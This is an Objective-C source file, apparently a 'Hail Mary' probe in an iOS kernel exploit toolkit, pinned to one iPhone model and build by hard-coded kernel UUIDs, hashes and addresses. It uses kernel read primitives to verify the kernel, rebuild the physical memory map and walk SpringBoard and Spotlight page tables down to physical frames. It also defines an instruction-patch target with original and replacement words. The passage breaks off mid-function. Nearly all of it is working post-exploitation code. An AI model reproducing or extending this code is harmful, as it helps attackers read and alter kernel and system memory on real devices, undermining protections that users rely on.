#import "CNDHailMaryProbe.h"

#import "kexploit/kexploit_opa334.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"

#import <CommonCrypto/CommonDigest.h>
#import <mach-o/loader.h>
#import <sys/sysctl.h>

#define CND_HAIL_MARY_BUILD "23A341"
#define CND_HAIL_MARY_PRODUCT "iPhone17,2"
#define CND_HAIL_MARY_CACHE_UUID "DC5F2F67-1FC8-3905-873B-35D17D1A44E8"
#define CND_HAIL_MARY_SUBCACHE_UUID "E5139123-79ED-3CC2-8E2F-40C980D82033"
#define CND_HAIL_MARY_IMAGE_UUID "F3A89682-429D-3319-876B-46D2348E0DFD"
#define CND_HAIL_MARY_KERNEL_UUID "76BB58BF-911D-07E4-D681-DCE7F2DDA3CE"
#define CND_HAIL_MARY_KERNEL_SHA256 "7e66ddbb70b626c4502c3036620b59829b744c54712a74ca50f4a0c004c89f8c"
#define CND_HAIL_MARY_CONTEXT_SHA256 "542063d6c8ea82afbe734ace1895ba0f2b7ab15160c6053176604644741f20d5"

static const uint64_t kCNDHailMaryUnslidPatchAddress = UINT64_C(0x1be102ef0);
static const uint64_t kCNDHailMarySharedRegionBase = UINT64_C(0x180000000);
static const uint64_t kCNDHailMarySharedRegionOffset = UINT64_C(0x3e102ef0);
static const uint64_t kCNDHailMarySubcacheFileOffset = UINT64_C(0x44aaef0);
static const uint64_t kCNDHailMaryPageSize = UINT64_C(0x4000);
static const uint64_t kCNDHailMarySubpageRootAlignment = UINT64_C(0x80);
static const uint32_t kCNDHailMaryOriginalWord = UINT32_C(0x1a9f17f4);
static const uint32_t kCNDHailMaryReplacementWord = UINT32_C(0x52800034);
static const uint64_t kCNDHailMaryKernelUnslidBase =
    UINT64_C(0xfffffff007004000);
static const uint64_t kCNDHailMaryKernelGVirtBase =
    UINT64_C(0xfffffff007c38c68);
static const uint64_t kCNDHailMaryKernelGPhysBase =
    UINT64_C(0xfffffff007c69dc0);
static const uint64_t kCNDHailMaryKernelGPhysSize =
    UINT64_C(0xfffffff007c69dc8);
static const uint64_t kCNDHailMaryKernelPhysmapRangeState =
    UINT64_C(0xfffffff007cace28);
static const uint64_t kCNDHailMaryKernelPhysmapRangeCountPointer =
    UINT64_C(0xfffffff007cace30);
static const uint64_t kCNDHailMaryKernelPhysmapRangeRecordsPointer =
    UINT64_C(0xfffffff007cace38);
static const uint32_t kCNDHailMaryVMMapPmapOffset = UINT32_C(0x40);
static const uint32_t kCNDHailMaryPmapTTEOffset = UINT32_C(0x0);
static const uint32_t kCNDHailMaryPmapTTEPOffset = UINT32_C(0x8);
static const uint32_t kCNDHailMaryPmapMinOffset = UINT32_C(0x10);
static const uint32_t kCNDHailMaryPmapMaxOffset = UINT32_C(0x18);
static const uint32_t kCNDHailMaryPmapPTAttrOffset = UINT32_C(0x20);
static const uint64_t kCNDHailMaryTTAddressMask =
    UINT64_C(0x0000fffffffff000);
static const uint64_t kCNDHailMaryGuardFileOffset =
    UINT64_C(0x44aae5c);
static const size_t kCNDHailMaryGuardLength = 188;
static const size_t kCNDHailMaryGuardPatchOffset = 148;

typedef struct {
    uint64_t physicalAddress;
    uint64_t virtualAddress;
    uint64_t length;
} CNDHailMaryPTOVEntry;

typedef struct {
    uint64_t physicalAddress;
    uint64_t virtualAddress;
    uint32_t pageCount;
    uint32_t reserved;
} CNDHailMaryPhysmapRangeRecord;

typedef struct {
    uint64_t kernelSlide;
    uint64_t gVirtBase;
    uint64_t gPhysBase;
    uint64_t gPhysSize;
    CNDHailMaryPTOVEntry entries[64];
    NSUInteger entryCount;
} CNDHailMaryPhysicalMap;

typedef struct {
    uint64_t size;
    uint64_t offsetMask;
    uint64_t shift;
    uint64_t indexMask;
    uint64_t validMask;
    uint64_t typeMask;
    uint64_t typeBlock;
} CNDHailMaryPageTableLevel;

static volatile int gCNDHailMaryProbeRunning;

static NSString *CNDHailMaryHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static NSString *CNDHailMaryBytesHex(const void *bytes, size_t length)
{
    const uint8_t *cursor = bytes;
    NSMutableString *hex = [NSMutableString stringWithCapacity:length * 2];
    for (size_t index = 0; index < length; index++) {
        [hex appendFormat:@"%02x", cursor[index]];
    }
    return hex;
}

static NSString *CNDHailMarySHA256(const void *bytes, size_t length)
{
    if (!bytes || length > UINT32_MAX) return @"";
    unsigned char digest[CC_SHA256_DIGEST_LENGTH] = {0};
    CC_SHA256(bytes, (CC_LONG)length, digest);
    return CNDHailMaryBytesHex(digest, sizeof(digest));
}

static BOOL CNDHailMaryParseHex(NSString *text, uint64_t *valueOut)
{
    if (![text isKindOfClass:NSString.class] ||
        ![text hasPrefix:@"0x"] || text.length <= 2) {
        return NO;
    }
    NSScanner *scanner = [NSScanner scannerWithString:
        [text substringFromIndex:2]];
    unsigned long long value = 0;
    if (![scanner scanHexLongLong:&value] || !scanner.isAtEnd) return NO;
    if (valueOut) *valueOut = (uint64_t)value;
    return YES;
}

static NSString *CNDHailMarySysctlString(const char *name)
{
    char value[128] = {0};
    size_t size = sizeof(value);
    if (sysctlbyname(name, value, &size, NULL, 0) != 0 || value[0] == '\0') {
        return @"";
    }
    return [NSString stringWithUTF8String:value] ?: @"";
}

static NSString *CNDHailMaryReportPath(void)
{
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    return [directory stringByAppendingPathComponent:@"CNDHailMaryProbe.json"];
}

static void CNDHailMarySaveReport(NSDictionary<NSString *, id> *report,
                                  NSString *path)
{
    if (!report || path.length == 0) return;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
                                                   options:NSJSONWritingPrettyPrinted |
                                                           NSJSONWritingSortedKeys
                                                     error:nil];
    if (data) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
    }
}

static BOOL CNDHailMaryKernelPointer(uint64_t value)
{
    return value != 0 && is_kaddr_valid(value) && (value & 0x3ULL) == 0;
}

static uint64_t CNDHailMaryUnpackObject(uint32_t packed)
{
    if (packed == 0 || VM_MIN_KERNEL_ADDRESS == 0) return 0;
    uint64_t object = VM_MIN_KERNEL_ADDRESS + ((uint64_t)packed << 6);
    return CNDHailMaryKernelPointer(object) ? object : 0;
}

static BOOL CNDHailMaryOffsetsMatch(NSMutableDictionary<NSString *, id> *report)
{
    NSDictionary<NSString *, NSNumber *> *actual = @{
        @"proc.p_proc_ro": @(off_proc_p_proc_ro),
        @"proc.p_pid": @(off_proc_p_pid),
        @"proc.p_name": @(off_proc_p_name),
        @"proc_ro.pr_task": @(off_proc_ro_pr_task),
        @"task.map": @(off_task_map),
        @"vm_map.hdr": @(off_vm_map_hdr),
        @"vm_map_header.nentries": @(off_vm_map_header_nentries),
        @"vm_map_header.links.next": @(off_vm_map_header_links_next),
        @"vm_map_entry.links.next": @(off_vm_map_entry_links_next),
        @"vm_map_entry.vme_object_or_delta": @(off_vm_map_entry_vme_object_or_delta),
        @"vm_map_entry.vme_alias": @(off_vm_map_entry_vme_alias),
        @"vm_object.size": @(off_vm_object_vo_un1_vou_size),
    };
    NSDictionary<NSString *, NSNumber *> *expected = @{
        @"proc.p_proc_ro": @0x18,
        @"proc.p_pid": @0x60,
        @"proc.p_name": @0x57d,
        @"proc_ro.pr_task": @0x8,
        @"task.map": @0x28,
        @"vm_map.hdr": @0x10,
        @"vm_map_header.nentries": @0x20,
        @"vm_map_header.links.next": @0x8,
        @"vm_map_entry.links.next": @0x8,
        @"vm_map_entry.vme_object_or_delta": @0x3c,
        @"vm_map_entry.vme_alias": @0x40,
        @"vm_object.size": @0x18,
    };

    BOOL matches = [actual isEqualToDictionary:expected] &&
        VM_MIN_KERNEL_ADDRESS != 0 && VM_MAX_KERNEL_ADDRESS != 0 &&
        t1sz_boot != 0;
    report[@"kernelOffsets"] = actual;
    report[@"kernelOffsetsExact"] = @(matches);
    report[@"kernelPointerRange"] = @{
        @"minimum": CNDHailMaryHex(VM_MIN_KERNEL_ADDRESS),
        @"maximum": CNDHailMaryHex(VM_MAX_KERNEL_ADDRESS),
        @"t1szBoot": @(t1sz_boot),
    };
    return matches;
}

static BOOL CNDHailMaryAddUnsigned(uint64_t left, uint64_t right,
                                   uint64_t *resultOut)
{
    if (right > UINT64_MAX - left) return NO;
    if (resultOut) *resultOut = left + right;
    return YES;
}

static NSString *CNDHailMaryUUIDString(const uint8_t uuid[16])
{
    if (!uuid) return @"";
    return [NSString stringWithFormat:
        @"%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
        uuid[0], uuid[1], uuid[2], uuid[3], uuid[4], uuid[5],
        uuid[6], uuid[7], uuid[8], uuid[9], uuid[10], uuid[11],
        uuid[12], uuid[13], uuid[14], uuid[15]];
}

static BOOL CNDHailMaryValidateKernelIdentity(
    NSMutableDictionary<NSString *, id> *report, NSString **errorOut)
{
    uint64_t expectedRuntimeBase = 0;
    if (!CNDHailMaryAddUnsigned(kCNDHailMaryKernelUnslidBase,
                                g_kernel_slide,
                                &expectedRuntimeBase) ||
        g_kernel_base != expectedRuntimeBase ||
        !CNDHailMaryKernelPointer(g_kernel_base)) {
        if (errorOut) *errorOut = @"kernel-base-slide-mismatch";
        return NO;
    }

    struct mach_header_64 header = {0};
    kreadbuf(g_kernel_base, &header, sizeof(header));
    if (header.magic != MH_MAGIC_64 || header.cputype != CPU_TYPE_ARM64 ||
        header.filetype != MH_FILESET || header.ncmds == 0 ||
        header.ncmds > 4096 || header.sizeofcmds < sizeof(struct uuid_command) ||
        header.sizeofcmds > UINT32_C(0x200000)) {
        if (errorOut) *errorOut = @"kernel-mach-header-mismatch";
        return NO;
    }

    struct uuid_command uuidCommand = {0};
    kreadbuf(g_kernel_base + sizeof(header), &uuidCommand,
             sizeof(uuidCommand));
    NSString *uuid = CNDHailMaryUUIDString(uuidCommand.uuid);
    BOOL uuidMatches = uuidCommand.cmd == LC_UUID &&
        uuidCommand.cmdsize == sizeof(uuidCommand) &&
        [uuid isEqual:@CND_HAIL_MARY_KERNEL_UUID];
    report[@"liveKernel"] = @{
        @"runtimeBase": CNDHailMaryHex(g_kernel_base),
        @"slide": CNDHailMaryHex(g_kernel_slide),
        @"uuid": uuid,
        @"uuidMatches": @(uuidMatches),
        @"offlineKernelSHA256": @CND_HAIL_MARY_KERNEL_SHA256,
        @"machHeader": @{
            @"fileType": @(header.filetype),
            @"loadCommandCount": @(header.ncmds),
            @"loadCommandBytes": @(header.sizeofcmds),
        },
    };
    if (!uuidMatches) {
        if (errorOut) *errorOut = @"kernel-uuid-mismatch";
        return NO;
    }
    return YES;
}

static BOOL CNDHailMaryRuntimeKernelSymbol(uint64_t unslid,
                                          uint64_t slide,
                                          uint64_t *runtimeOut)
{
    uint64_t runtime = 0;
    if (!CNDHailMaryAddUnsigned(unslid, slide, &runtime) ||
        !CNDHailMaryKernelPointer(runtime)) {
        return NO;
    }
    if (runtimeOut) *runtimeOut = runtime;
    return YES;
}

static BOOL CNDHailMaryLoadPhysicalMap(
    CNDHailMaryPhysicalMap *physicalMap,
    NSMutableDictionary<NSString *, id> *report,
    NSString **errorOut)
{
    if (!physicalMap) return NO;
    memset(physicalMap, 0, sizeof(*physicalMap));
    physicalMap->kernelSlide = g_kernel_slide;

    uint64_t gVirtBaseAddress = 0;
    uint64_t gPhysBaseAddress = 0;
    uint64_t gPhysSizeAddress = 0;
    uint64_t rangeStateAddress = 0;
    uint64_t rangeCountPointerAddress = 0;
    uint64_t rangeRecordsPointerAddress = 0;
    if (!CNDHailMaryRuntimeKernelSymbol(kCNDHailMaryKernelGVirtBase,
                                        g_kernel_slide,
                                        &gVirtBaseAddress) ||
        !CNDHailMaryRuntimeKernelSymbol(kCNDHailMaryKernelGPhysBase,
                                        g_kernel_slide,
                                        &gPhysBaseAddress) ||
        !CNDHailMaryRuntimeKernelSymbol(kCNDHailMaryKernelGPhysSize,
                                        g_kernel_slide,
                                        &gPhysSizeAddress) ||
        !CNDHailMaryRuntimeKernelSymbol(kCNDHailMaryKernelPhysmapRangeState,
                                        g_kernel_slide,
                                        &rangeStateAddress) ||
        !CNDHailMaryRuntimeKernelSymbol(
            kCNDHailMaryKernelPhysmapRangeCountPointer,
            g_kernel_slide, &rangeCountPointerAddress) ||
        !CNDHailMaryRuntimeKernelSymbol(
            kCNDHailMaryKernelPhysmapRangeRecordsPointer,
            g_kernel_slide, &rangeRecordsPointerAddress)) {
        if (errorOut) *errorOut = @"kernel-symbol-slide-overflow";
        return NO;
    }

    physicalMap->gVirtBase = kread64(gVirtBaseAddress);
    physicalMap->gPhysBase = kread64(gPhysBaseAddress);
    physicalMap->gPhysSize = kread64(gPhysSizeAddress);
    if (!CNDHailMaryKernelPointer(physicalMap->gVirtBase) ||
        physicalMap->gPhysBase == 0 ||
        (physicalMap->gPhysBase & (kCNDHailMaryPageSize - 1)) != 0 ||
        physicalMap->gPhysSize < UINT64_C(0x10000000) ||
        physicalMap->gPhysSize > UINT64_C(0x10000000000) ||
        physicalMap->gPhysSize >
            UINT64_MAX - physicalMap->gPhysBase) {
        if (errorOut) *errorOut = @"invalid-live-physical-map-globals";
        return NO;
    }

    uint8_t rangeState = (uint8_t)(kread32(rangeStateAddress) & 0xffU);
    uint64_t rangeCountAddress = kread_ptr(rangeCountPointerAddress);
    uint64_t rangeRecordsAddress = kread_ptr(rangeRecordsPointerAddress);
    uint32_t rangeCount = CNDHailMaryKernelPointer(rangeCountAddress)
        ? kread32(rangeCountAddress) : 0;
    if ((rangeState & 1U) == 0 ||
        !CNDHailMaryKernelPointer(rangeCountAddress) ||
        !CNDHailMaryKernelPointer(rangeRecordsAddress) ||
        rangeCount == 0 || rangeCount > 64) {
        report[@"physicalMapInspection"] = @{
            @"source": @"23A341-exact-phystokv-disassembly",
            @"rangeStateAddress": CNDHailMaryHex(rangeStateAddress),
            @"rangeState": @(rangeState),
            @"rangeCountPointerAddress": CNDHailMaryHex(
                rangeCountPointerAddress),
            @"rangeCountAddress": CNDHailMaryHex(rangeCountAddress),
            @"rangeCount": @(rangeCount),
            @"rangeRecordsPointerAddress": CNDHailMaryHex(
                rangeRecordsPointerAddress),
            @"rangeRecordsAddress": CNDHailMaryHex(rangeRecordsAddress),
        };
        if (errorOut) *errorOut = @"invalid-live-physmap-range-anchors";
        return NO;
    }

    NSMutableArray<NSDictionary<NSString *, id> *> *entries =
        [NSMutableArray arrayWithCapacity:rangeCount];
    NSMutableArray<NSDictionary<NSString *, id> *> *rawEntries =
        [NSMutableArray arrayWithCapacity:rangeCount];
    for (NSUInteger index = 0; index < rangeCount; index++) {
        CNDHailMaryPhysmapRangeRecord raw = {0};
        kreadbuf(rangeRecordsAddress +
                     index * sizeof(CNDHailMaryPhysmapRangeRecord),
                 &raw, sizeof(raw));
        [rawEntries addObject:@{
            @"index": @(index),
            @"physicalAddress": CNDHailMaryHex(raw.physicalAddress),
            @"virtualAddress": CNDHailMaryHex(raw.virtualAddress),
            @"pageCount": @(raw.pageCount),
            @"reserved": @(raw.reserved),
        }];
        CNDHailMaryPTOVEntry entry = {
            .physicalAddress = raw.physicalAddress,
            .virtualAddress = raw.virtualAddress,
            .length = (uint64_t)raw.pageCount << 14,
        };
        NSString *invalidReason = nil;
        if (entry.physicalAddress == 0) {
            invalidReason = @"zero-physical-address";
        } else if (!CNDHailMaryKernelPointer(entry.virtualAddress)) {
            invalidReason = @"invalid-kernel-virtual-address";
        } else if ((entry.physicalAddress &
                    (kCNDHailMaryPageSize - 1)) != 0) {
            invalidReason = @"unaligned-physical-address";
        } else if ((entry.virtualAddress &
                    (kCNDHailMaryPageSize - 1)) != 0) {
            invalidReason = @"unaligned-kernel-virtual-address";
        } else if (raw.pageCount == 0) {
            invalidReason = @"zero-page-count";
        } else if (entry.length >
                   UINT64_MAX - entry.physicalAddress) {
            invalidReason = @"physical-range-overflow";
        } else if (entry.length >
                   UINT64_MAX - entry.virtualAddress) {
            invalidReason = @"kernel-virtual-range-overflow";
        }
        if (invalidReason) {
            report[@"physicalMapInspection"] = @{
                @"source":
                    @"23A341-exact-phystokv-disassembly",
                @"gVirtBase": CNDHailMaryHex(physicalMap->gVirtBase),
                @"gPhysBase": CNDHailMaryHex(physicalMap->gPhysBase),
                @"gPhysSize": CNDHailMaryHex(physicalMap->gPhysSize),
                @"rangeStateAddress": CNDHailMaryHex(rangeStateAddress),
                @"rangeState": @(rangeState),
                @"rangeCountPointerAddress": CNDHailMaryHex(
                    rangeCountPointerAddress),
                @"rangeCountAddress": CNDHailMaryHex(rangeCountAddress),
                @"rangeCount": @(rangeCount),
                @"rangeRecordsPointerAddress": CNDHailMaryHex(
                    rangeRecordsPointerAddress),
                @"rangeRecordsAddress": CNDHailMaryHex(
                    rangeRecordsAddress),
                @"rawEntries": rawEntries,
                @"invalidEntryIndex": @(index),
                @"invalidReason": invalidReason,
            };
            if (errorOut) *errorOut = [NSString stringWithFormat:
                @"invalid-live-ptov-entry-%lu-%@",
                (unsigned long)index, invalidReason];
            return NO;
        }
        physicalMap->entries[physicalMap->entryCount++] = entry;
        [entries addObject:@{
            @"physicalAddress": CNDHailMaryHex(entry.physicalAddress),
            @"virtualAddress": CNDHailMaryHex(entry.virtualAddress),
            @"length": CNDHailMaryHex(entry.length),
        }];
    }
    if ((uint8_t)(kread32(rangeStateAddress) & 0xffU) != rangeState ||
        kread_ptr(rangeCountPointerAddress) != rangeCountAddress ||
        kread_ptr(rangeRecordsPointerAddress) != rangeRecordsAddress ||
        kread32(rangeCountAddress) != rangeCount) {
        if (errorOut) *errorOut = @"physmap-range-anchors-changed";
        return NO;
    }

    report[@"physicalMap"] = @{
        @"source": @"23A341-exact-phystokv-disassembly",
        @"gVirtBaseSymbol": CNDHailMaryHex(gVirtBaseAddress),
        @"gPhysBaseSymbol": CNDHailMaryHex(gPhysBaseAddress),
        @"gPhysSizeSymbol": CNDHailMaryHex(gPhysSizeAddress),
        @"rangeStateAddress": CNDHailMaryHex(rangeStateAddress),
        @"rangeState": @(rangeState),
        @"rangeCountPointerAddress": CNDHailMaryHex(
            rangeCountPointerAddress),
        @"rangeCountAddress": CNDHailMaryHex(rangeCountAddress),
        @"rangeCount": @(rangeCount),
        @"rangeRecordsPointerAddress": CNDHailMaryHex(
            rangeRecordsPointerAddress),
        @"rangeRecordsAddress": CNDHailMaryHex(rangeRecordsAddress),
        @"gVirtBase": CNDHailMaryHex(physicalMap->gVirtBase),
        @"gPhysBase": CNDHailMaryHex(physicalMap->gPhysBase),
        @"gPhysSize": CNDHailMaryHex(physicalMap->gPhysSize),
        @"ptovEntries": entries,
        @"rawEntries": rawEntries,
    };
    return YES;
}

static BOOL CNDHailMaryPhysicalToKernelVirtual(
    const CNDHailMaryPhysicalMap *physicalMap,
    uint64_t physicalAddress,
    uint64_t *virtualAddressOut)
{
    if (!physicalMap || physicalAddress == 0) return NO;
    for (NSUInteger index = 0; index < physicalMap->entryCount; index++) {
        CNDHailMaryPTOVEntry entry = physicalMap->entries[index];
        if (physicalAddress >= entry.physicalAddress &&
            physicalAddress - entry.physicalAddress < entry.length) {
            uint64_t virtualAddress = entry.virtualAddress +
                (physicalAddress - entry.physicalAddress);
            if (!CNDHailMaryKernelPointer(virtualAddress)) return NO;
            if (virtualAddressOut) *virtualAddressOut = virtualAddress;
            return YES;
        }
    }

    return NO;
}

static BOOL CNDHailMaryReadPageTableLevel(
    uint64_t levelInfoAddress, unsigned level,
    CNDHailMaryPageTableLevel *levelOut)
{
    if (!levelOut || level > 3 ||
        !CNDHailMaryKernelPointer(levelInfoAddress)) return NO;
    uint64_t address = levelInfoAddress +
        level * sizeof(CNDHailMaryPageTableLevel);
    kreadbuf(address, levelOut, sizeof(*levelOut));
    return levelOut->size != 0 &&
        levelOut->offsetMask == levelOut->size - 1 &&
        levelOut->shift < 64 && levelOut->indexMask != 0;
}

static BOOL CNDHailMaryPageTableGeometryMatches(
    uint64_t attribute, uint64_t virtualAddress,
    CNDHailMaryPageTableLevel levels[4],
    NSDictionary<NSString *, id> **geometryOut,
    NSString **errorOut)
{
    static const CNDHailMaryPageTableLevel expected[4] = {
        {0},
        {UINT64_C(0x1000000000), UINT64_C(0xfffffffff), 36,
         UINT64_C(0x7ff000000000), 1, 2, 0},
        {UINT64_C(0x2000000), UINT64_C(0x1ffffff), 25,
         UINT64_C(0xffe000000), 1, 2, 0},
        {UINT64_C(0x4000), UINT64_C(0x3fff), 14,
         UINT64_C(0x1ffc000), 3, 2, 2},
    };
    if (!CNDHailMaryKernelPointer(attribute)) {
        if (errorOut) *errorOut = @"invalid-pmap-page-table-attributes";
        return NO;
    }
    uint64_t levelInfoAddress = kread_ptr(attribute + 0x0);
    uint32_t rootLevel = kread32(attribute + 0x40);
    uint32_t maximumLevel = kread32(attribute + 0x48);
    uint64_t pageSize = kread64(attribute + 0x58);
    uint64_t pageShift = kread64(attribute + 0x60);
    uint32_t geometryID = kread32(attribute + 0x68) & 0xffU;
    uint64_t virtualAddressMask = kread64(attribute + 0x70);
    if (!CNDHailMaryKernelPointer(levelInfoAddress) || rootLevel != 1 ||
        maximumLevel != 3 || pageSize != kCNDHailMaryPageSize ||
        pageShift != 14 ||
        virtualAddressMask != UINT64_C(0x7fffffffff) ||
        (virtualAddress & ~virtualAddressMask) != 0) {
        if (errorOut) *errorOut = @"unexpected-live-page-table-geometry";
        return NO;
    }

    NSMutableArray<NSDictionary<NSString *, id> *> *levelReports =
        [NSMutableArray array];
    for (unsigned level = rootLevel; level <= maximumLevel; level++) {
        if (!CNDHailMaryReadPageTableLevel(levelInfoAddress, level,
                                            &levels[level]) ||
            memcmp(&levels[level], &expected[level],
                   sizeof(levels[level])) != 0) {
            if (errorOut) *errorOut = @"page-table-level-layout-mismatch";
            return NO;
        }
        [levelReports addObject:@{
            @"level": @(level),
            @"size": CNDHailMaryHex(levels[level].size),
            @"offsetMask": CNDHailMaryHex(levels[level].offsetMask),
            @"shift": @(levels[level].shift),
            @"indexMask": CNDHailMaryHex(levels[level].indexMask),
            @"validMask": CNDHailMaryHex(levels[level].validMask),
            @"typeMask": CNDHailMaryHex(levels[level].typeMask),
            @"typeBlock": CNDHailMaryHex(levels[level].typeBlock),
        }];
    }
    if (geometryOut) {
        *geometryOut = @{
            @"attribute": CNDHailMaryHex(attribute),
            @"levelInfo": CNDHailMaryHex(levelInfoAddress),
            @"rootLevel": @(rootLevel),
            @"maximumLevel": @(maximumLevel),
            @"pageSize": @(pageSize),
            @"pageShift": @(pageShift),
            @"geometryID": @(geometryID),
            @"virtualAddressMask": CNDHailMaryHex(virtualAddressMask),
            @"levels": levelReports,
        };
    }
    return YES;
}

static NSDictionary<NSString *, id> *CNDHailMaryTranslateVirtualAddress(
    NSDictionary<NSString *, id> *process,
    uint64_t virtualAddress,
    const CNDHailMaryPhysicalMap *physicalMap,
    NSString **errorOut)
{
    uint64_t map = 0;
    if (!CNDHailMaryParseHex(process[@"map"], &map) ||
        !CNDHailMaryKernelPointer(map)) {
        if (errorOut) *errorOut = @"invalid-process-map-for-pmap-walk";
        return nil;
    }
    uint64_t pmap = kread_ptr(map + kCNDHailMaryVMMapPmapOffset);
    if (!CNDHailMaryKernelPointer(pmap)) {
        if (errorOut) *errorOut = @"invalid-vm-map-pmap";
        return nil;
    }

    uint64_t rootTable = kread_ptr(pmap + kCNDHailMaryPmapTTEOffset);
    uint64_t rootPhysical = kread64(pmap + kCNDHailMaryPmapTTEPOffset);
    uint64_t minimum = kread64(pmap + kCNDHailMaryPmapMinOffset);
    uint64_t maximum = kread64(pmap + kCNDHailMaryPmapMaxOffset);
    uint64_t attributes = kread_ptr(pmap + kCNDHailMaryPmapPTAttrOffset);
    uint64_t rootFromPhysical = 0;
    /*
     * arm64 SPTM user pmaps use 128-byte subpage user root tables (SURTs)
     * packed inside a 16 KiB physical page.  The root therefore has the exact
     * PMAP_ROOT_ALLOC_SIZE alignment, while all lower-level table pages retain
     * the native 16 KiB alignment checked below.
     */
    if (!CNDHailMaryKernelPointer(rootTable) || rootPhysical == 0 ||
        (rootPhysical & (kCNDHailMarySubpageRootAlignment - 1)) != 0 ||
        virtualAddress < minimum || virtualAddress >= maximum ||
        !CNDHailMaryPhysicalToKernelVirtual(
            physicalMap, rootPhysical, &rootFromPhysical) ||
        rootFromPhysical != rootTable) {
        if (errorOut) *errorOut = @"invalid-or-inconsistent-pmap-root";
        return nil;
    }

    CNDHailMaryPageTableLevel levels[4] = {0};
    NSDictionary<NSString *, id> *geometry = nil;
    if (!CNDHailMaryPageTableGeometryMatches(
            attributes, virtualAddress, levels, &geometry, errorOut)) {
        return nil;
    }
    uint64_t validAddressMask = UINT64_C(0x7fffffffff);
    uint64_t table = rootTable;
    uint64_t physicalAddress = 0;
    uint64_t terminalEntryAddress = 0;
    uint64_t terminalEntryValue = 0;
    unsigned terminalLevel = 0;
    uint64_t entryAddresses[3] = {0};
    uint64_t entryValues[3] = {0};
    NSMutableArray<NSDictionary<NSString *, id> *> *path =
        [NSMutableArray array];

    for (unsigned level = 1; level <= 3; level++) {
        CNDHailMaryPageTableLevel info = levels[level];
        uint64_t index = ((virtualAddress & validAddressMask) &
                          info.indexMask) >> info.shift;
        if (index > UINT64_MAX / sizeof(uint64_t) ||
            index * sizeof(uint64_t) > UINT64_MAX - table) {
            if (errorOut) *errorOut = @"page-table-entry-address-overflow";
            return nil;
        }
        uint64_t entryAddress = table + index * sizeof(uint64_t);
        if (!CNDHailMaryKernelPointer(entryAddress)) {
            if (errorOut) *errorOut = @"invalid-page-table-entry-address";
            return nil;
        }
        uint64_t entryValue = kread64(entryAddress);
        entryAddresses[level - 1] = entryAddress;
        entryValues[level - 1] = entryValue;
        if ((entryValue & info.validMask) != info.validMask) {
            if (errorOut) *errorOut = [NSString stringWithFormat:
                @"invalid-level-%u-translation-entry", level];
            return nil;
        }
        BOOL terminal = (entryValue & info.typeMask) == info.typeBlock;
        [path addObject:@{
            @"level": @(level),
            @"table": CNDHailMaryHex(table),
            @"index": @(index),
            @"entryAddress": CNDHailMaryHex(entryAddress),
            @"entryValue": CNDHailMaryHex(entryValue),
            @"terminal": @(terminal),
        }];
        if (terminal) {
            physicalAddress =
                ((entryValue & kCNDHailMaryTTAddressMask &
                  ~info.offsetMask) |
                 (virtualAddress & info.offsetMask));
            terminalEntryAddress = entryAddress;
            terminalEntryValue = entryValue;
            terminalLevel = level;
            break;
        }
        if (level == 3) {
            if (errorOut) *errorOut = @"nonterminal-leaf-translation-entry";
            return nil;
        }
        uint64_t nextPhysical = entryValue & kCNDHailMaryTTAddressMask;
        if (nextPhysical == 0 ||
            (nextPhysical & (kCNDHailMaryPageSize - 1)) != 0 ||
            !CNDHailMaryPhysicalToKernelVirtual(
                physicalMap, nextPhysical, &table)) {
            if (errorOut) *errorOut = @"unmappable-page-table-page";
            return nil;
        }
    }

    if (physicalAddress == 0 || terminalLevel == 0) {
        if (errorOut) *errorOut = @"physical-address-unresolved";
        return nil;
    }
    for (unsigned index = 0; index < terminalLevel; index++) {
        if (kread64(entryAddresses[index]) != entryValues[index]) {
            if (errorOut) *errorOut = @"page-table-changed-during-observation";
            return nil;
        }
    }
    if (kread_ptr(map + kCNDHailMaryVMMapPmapOffset) != pmap ||
        kread_ptr(pmap + kCNDHailMaryPmapTTEOffset) != rootTable ||
        kread64(pmap + kCNDHailMaryPmapTTEPOffset) != rootPhysical ||
        kread_ptr(pmap + kCNDHailMaryPmapPTAttrOffset) != attributes) {
        if (errorOut) *errorOut = @"pmap-changed-during-observation";
        return nil;
    }

    uint64_t frame = physicalAddress & ~(kCNDHailMaryPageSize - 1);
    return @{
        @"process": process[@"name"] ?: @"",
        @"pid": process[@"pid"] ?: @0,
        @"virtualAddress": CNDHailMaryHex(virtualAddress),
        @"map": CNDHailMaryHex(map),
        @"pmap": CNDHailMaryHex(pmap),
        @"rootTable": CNDHailMaryHex(rootTable),
        @"rootPhysical": CNDHailMaryHex(rootPhysical),
        @"minimum": CNDHailMaryHex(minimum),
        @"maximum": CNDHailMaryHex(maximum),
        @"geometry": geometry,
        @"path": path,
        @"terminalLevel": @(terminalLevel),
        @"terminalEntryAddress": CNDHailMaryHex(terminalEntryAddress),
        @"terminalEntryValue": CNDHailMaryHex(terminalEntryValue),
        @"physicalAddress": CNDHailMaryHex(physicalAddress),
        @"physicalFrame": CNDHailMaryHex(frame),
        @"offsetWithinFrame": @(physicalAddress &
            (kCNDHailMaryPageSize - 1)),
        @"translationStable": @YES,
    };
}

BOOL CNDHailMaryProbeTranslateSharedRuntimeAddress(
    NSDictionary<NSString *, id> *report,
    uint64_t runtimeVirtualAddress,
    NSDictionary<NSString *, id> **springBoardTranslationOut,
    NSDictionary<NSString *, id> **spotlightTranslationOut,
    uint64_t *physicalFrameOut,
    uint64_t *physicalAddressOut,
    uint64_t *frameKernelVirtualAddressOut,
    NSString **errorOut)
{
    if (springBoardTranslationOut) *springBoardTranslationOut = nil;
    if (spotlightTranslationOut) *spotlightTranslationOut = nil;
    if (physicalFrameOut) *physicalFrameOut = 0;
    if (physicalAddressOut) *physicalAddressOut = 0;
    if (frameKernelVirtualAddressOut) *frameKernelVirtualAddressOut = 0;
    if (errorOut) *errorOut = nil;

    NSDictionary<NSString *, id> *physicalProof =
        report[@"physicalPageProof"];
    if (![report isKindOfClass:NSDictionary.class] ||
        [report[@"schemaVersion"] unsignedIntegerValue] != 2 ||
        ![report[@"probe"] isEqual:@"hail-mary-physical-page-proof"] ||
        ![report[@"productType"] isEqual:@CND_HAIL_MARY_PRODUCT] ||
